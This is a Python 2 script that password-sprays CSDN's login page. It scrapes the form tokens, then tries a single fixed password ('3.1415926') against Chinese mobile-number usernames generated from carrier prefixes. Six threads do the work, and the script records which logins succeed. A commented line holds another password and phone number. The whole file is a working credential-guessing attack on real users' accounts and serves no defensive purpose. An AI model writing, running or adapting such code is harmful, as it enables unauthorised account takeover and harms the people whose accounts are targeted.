# -*- coding:utf-8 -*-

from crack import Crack
import re
import urllib2,cookielib,urllib
import threading

class CrackCSDN(Crack):
    def __init__(self,password):
        Crack.__init__(self,password)
        
    def web_login(self,count):
        try:
            urllib.urlopen("http://www.baidu.com")
        except:
            print "please check your net"
            while True:
                try:
                    urllib.urlopen("http://www.baidu.com")
                    break
                except:
                    time.sleep(10)
        try:
            cj = cookielib.LWPCookieJar()
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
            urllib2.install_opener(opener)

            h = opener.open('https://passport.csdn.net').read().decode("utf8")  
            patten1 = re.compile(r'name="lt" value="(.*?)"')  
            patten2 = re.compile(r'name="execution" value="(.*?)"')  
            b1 = patten1.search(h)  
            b2 = patten2.search(h)  
            postData = {  
                'username': count,  
                'password': self.password,  
                'lt': b1.group(1),  
                'execution': b2.group(1),  
                '_eventId': 'submit',  
            }  
            postData= urllib.urlencode(postData).encode(encoding='UTF8')  
            opener.addheaders = [('Origin', 'https://passport.csdn.net'),  
                                ('User-Agent',  
                                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586'),  
                                ('Referer', 'https://passport.csdn.net/account/login?from=http://my.csdn.net/my/mycsdn')  
                                ]  
            response = opener.open('https://passport.csdn.net', data=postData)  
            text = response.read().decode('utf-8', 'ignore')  
            response2 = opener.open('http://my.csdn.net/my/mycsdn')
            text2 = response2.read().decode('utf-8', 'ignore')
            # print text2
            flag = re.search("my/follow",text2)
            if flag:
                return True
            return False
        except Exception, e:
            print e.message
            return False

def crack(segment,password,crackname):
    c = CrackCSDN(password)
    c.ID_SEG = segment
    #c.CURRENT_COUNT = 95379446
    c.LAST_COUNT_FILE = crackname + ".txt"
    c.crack()
    
    
def main():
    seg_1 = [ 134, 135, 136, 137, 138, 139 ]
    seg_2 = [ 147, 150, 151, 152, 157, 158 ]
    seg_3 = [ 159, 178, 182, 183, 184, 187 ]
    seg_4 = [ 188, 130, 131, 132, 155, 156 ]
    seg_5 = [ 185, 186, 145, 176, 133, 153 ]
    seg_6 = [ 177, 180, 181, 189 ]
    segments = [ seg_1, seg_2, seg_3, seg_4, seg_5, seg_6 ]
    password = "3.1415926"
    
    thread_num = 0
    for seg in segments:
        t = threading.Thread(target=crack,args=(seg,password,"thread_%d"%thread_num),name="thread-%d"%thread_num)
        t.start()
        thread_num += 1

        
if __name__ == "__main__":
    main()
    # c = CrackCSDN("wakx.520")
    # c.web_login("18895379450")